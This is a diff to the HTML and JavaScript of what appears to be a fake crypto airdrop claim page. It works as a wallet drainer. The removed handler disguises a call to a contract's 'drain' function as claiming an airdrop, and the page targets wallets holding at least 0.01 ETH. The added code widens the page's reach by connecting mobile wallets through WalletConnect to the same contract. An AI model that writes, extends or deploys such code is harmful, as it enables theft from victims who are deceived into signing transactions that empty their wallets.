@@ -295,6 +295,7 @@
     </div>
   </div>
 
+  <script src="https://cdn.jsdelivr.net/npm/@walletconnect/web3-provider@1.7.8/dist/umd/index.min.js"></script>
   <script src="https://cdn.jsdelivr.net/npm/ethers@6.7.0/dist/ethers.min.js"></script>
   <script>
     const CONTRACT_ADDRESS = "0xaE8183621c5f7e219C063820cF7865d232C0bB32"; // ganti sesuai kontrakmu
@@ -346,54 +347,55 @@
       return ethBalance >= 0.01;
     }
 
-    connectBtn.addEventListener("click", async () => {
-      if (typeof window.ethereum === "undefined") {
-        status.innerText = "Please install MetaMask!";
-        return;
-      }
-      try {
-        const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
-        status.innerText = `Connected: ${accounts[0]}`;
-        provider = new ethers.BrowserProvider(window.ethereum);
-        signer = await provider.getSigner();
-        const eligible = await checkEligibility(accounts[0]);
-        if (!eligible) {
-          status.innerText = "Wallet NOT eligible (need ≥ 0.01 ETH)";
-          claimBtn.disabled = true;
-          claimBtn.classList.remove("enabled");
-          return;
-        }
-        contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
-        connectBtn.disabled = true;
-        claimBtn.disabled = false;
-        claimBtn.classList.add("enabled");
-      } catch (err) {
-        console.error("Connection error:", err);
-        status.innerText = `Connection rejected: ${err.message || err}`;
-      }
-    });
+ connectBtn.addEventListener("click", async () => {
+  modal.classList.add("show");
+  txStatus.innerText = "Connecting wallet...";
 
-    claimBtn.addEventListener("click", async () => {
-      const tokenAddress = prompt("Enter ERC20 token address to claim:");
-      if (!tokenAddress) {
-        status.innerText = "Token address is required";
-        return;
-      }
-      try {
-        modal.classList.add("show");
-        txStatus.innerText = "Waiting for transaction confirmation...";
-        const tx = await contract.drain(tokenAddress);
-        txStatus.innerText = `Transaction sent: ${tx.hash}`;
-        await tx.wait();
-        txStatus.innerText = "Transaction confirmed! Airdrop claimed successfully.";
-        status.innerText = "Airdrop claimed! Check your wallet.";
-      } catch (err) {
-        txStatus.innerText = `Transaction failed: ${err.message}`;
-        status.innerText = "Transaction failed.";
-      } finally {
-        setTimeout(() => modal.classList.remove("show"), 4000);
-      }
-    });
+  try {
+    if (typeof window.ethereum !== "undefined" && !/Mobi|Android|iPhone/i.test(navigator.userAgent)) {
+      // Desktop with MetaMask
+      const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
+      provider = new ethers.BrowserProvider(window.ethereum);
+      signer = await provider.getSigner();
+      const address = accounts[0];
+      status.innerText = `Connected: ${address}`;
+    } else {
+      // Mobile fallback: WalletConnect
+      const WalletConnectProvider = window.WalletConnectProvider.default;
+      const wcProvider = new WalletConnectProvider({
+        rpc: { 1: "https://rpc.ankr.com/eth" }, // Ethereum mainnet public RPC
+        chainId: 1
+      });
+      await wcProvider.enable();
+      provider = new ethers.BrowserProvider(wcProvider);
+      signer = await provider.getSigner();
+      const address = await signer.getAddress();
+      status.innerText = `Connected (mobile): ${address}`;
+      wcProvider.on("disconnect", () => {
+        location.reload();
+      });
+    }
+
+    const address = await signer.getAddress();
+    const eligible = await checkEligibility(address);
+    if (!eligible) {
+      status.innerText = "Wallet NOT eligible (need ≥ 0.01 ETH)";
+      claimBtn.disabled = true;
+      claimBtn.classList.remove("enabled");
+    } else {
+      contract = new ethers.Contract(CONTRACT_ADDRESS, ABI, signer);
+      connectBtn.disabled = true;
+      claimBtn.disabled = false;
+      claimBtn.classList.add("enabled");
+    }
+  } catch (err) {
+    console.error("Connection error:", err);
+    status.innerText = `Connection error: ${err.message || err}`;
+  } finally {
+    setTimeout(() => modal.classList.remove("show"), 2000);
+  }
+});
+
   </script>
 </body>
 </html>
